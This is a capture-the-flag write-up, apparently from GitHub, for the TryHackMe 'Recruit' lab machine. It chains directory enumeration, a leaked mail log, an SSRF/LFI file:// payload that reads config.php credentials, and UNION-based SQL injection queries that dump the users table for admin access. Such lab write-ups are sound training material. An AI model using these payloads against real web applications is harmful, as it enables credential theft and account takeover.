<img width="1459" height="299" alt="image" src="https://github.com/user-attachments/assets/e31251e3-6670-4f47-b0d5-f6d14cc7b931" />

# Recruit - Tryhackme Write-up

Target Machine-IP: 10.48.133.147

### Reconnaissance
```
nmap -sC -sV 10.48.133.147
```

<img width="1053" height="379" alt="image" src="https://github.com/user-attachments/assets/6ecb0570-0c6f-4512-a3b5-2abd043077c1" />

We got:
- Nmap: 22, 53, 80
- Apache 2.4.41
- PHPSESSID HttpOnly = false

### Enumeration

```
ffuf -u http://10.48.133.147/FUZZ \
-w /usr/share/wordlists/dirb/common.txt \
-e .php,.txt,.bak
```
<img width="260" height="598" alt="image" src="https://github.com/user-attachments/assets/01c99fab-c807-4018-a1d8-7250941dd977" />

ffuf discovered:
```
/api.php
/file.php
/mail/
/config.php
/dashboard.php
/sitemap.xml
```

This room probably has multiple vulns chained together.

Then I checked the web-app:

<img width="1913" height="864" alt="image" src="https://github.com/user-attachments/assets/4d2203b0-306e-451a-96f4-8285bab10bde" />

<img width="1907" height="863" alt="image" src="https://github.com/user-attachments/assets/a838d87d-d091-4f06-88ff-285e5ae4bfef" />

That FAQ basically told: “fetch and process candidate CVs from external sources”

That usually means:
- user submits URL
- backend fetches it server-side

Classic SSRF😈

<img width="1673" height="632" alt="image" src="https://github.com/user-attachments/assets/8d9e1135-1117-4e96-ae0c-b9c4955b258c" />

Now we have the SSRF endpoint:

```/file.php?cv=<URL>```

Multiple LFI payload variations were tested, including directory traversal, PHP wrappers, and file URI schemes but no success.

From directory enumeration identified the /mail/ directory. Browsing the directory revealed an accessible mail.log file. The log contained internal deployment emails and an email disclosed that the HR username was "hr" and that the HR password was temporarily stored in config.php.

<img width="1907" height="832" alt="image" src="https://github.com/user-attachments/assets/b6b2fef8-234f-4d9b-9a8e-05fa0dd11de7" />

The important part:
- HR login credentials (username: hr) are currently stored in the application configuration file (config.php)
- Administrator credentials are NOT stored in the application files and are securely maintained within the backend database.

I went back to do LFT payload again and the working payload is:

```
/file.php?cv=file:///var/www/html/config.php
```

<img width="1917" height="877" alt="image" src="https://github.com/user-attachments/assets/2851b51a-b490-4ba8-b5bf-90139789aad9" />

and login as HR:

<img width="1909" height="918" alt="image" src="https://github.com/user-attachments/assets/76528b2e-b806-44f4-a9e9-e70c892d22c4" />

Once logged in as HR, the dashboard exposed a candidate search bar. Testing the search parameter with SQL special characters produced a database error, identifying it as the SQL injection point.

To determine the number of columns returned by the query, I used the UNION SELECT technique. After testing different column counts, I found that the application accepted a query containing four columns, indicating that the original SQL statement returned four columns.

```
' UNION SELECT 1,2,3,4-- -
```

Next I dump database info:
```
' UNION SELECT 1,database(),user(),version()-- -
```

<img width="1911" height="916" alt="image" src="https://github.com/user-attachments/assets/f2d0ed30-97ab-40da-b5f2-0c98db0a3624" />

Enumerate tables:

```
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='recruit_db'-- -
```
<img width="1908" height="914" alt="image" src="https://github.com/user-attachments/assets/acd02760-6d9a-437d-86bb-3fb09987f796" />

Then enumerate colums in `users`:

```
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -
```

<img width="1900" height="921" alt="image" src="https://github.com/user-attachments/assets/88dd670e-6eec-447d-b888-7c16aee567d8" />

Good 🔥 now we got the REAL columns:
```
id
username
password
```

dump the creds:

```
' UNION SELECT id,username,password,4 FROM users-- -
```

<img width="1425" height="626" alt="image" src="https://github.com/user-attachments/assets/35f562a3-c8fa-433f-b833-8ddadcc1af1b" />

Then login as Admin and grab final flag😈.

<img width="1913" height="919" alt="image" src="https://github.com/user-attachments/assets/3ee2bf68-34ce-4e4d-a301-24f754e22139" />

## Key Takeaway

- Small information leaks can chain together.
- Mail logs exposed the location of sensitive credentials.
- LFI led to HR access.
- HR access exposed SQLi.
- SQLi led directly to admin compromise.
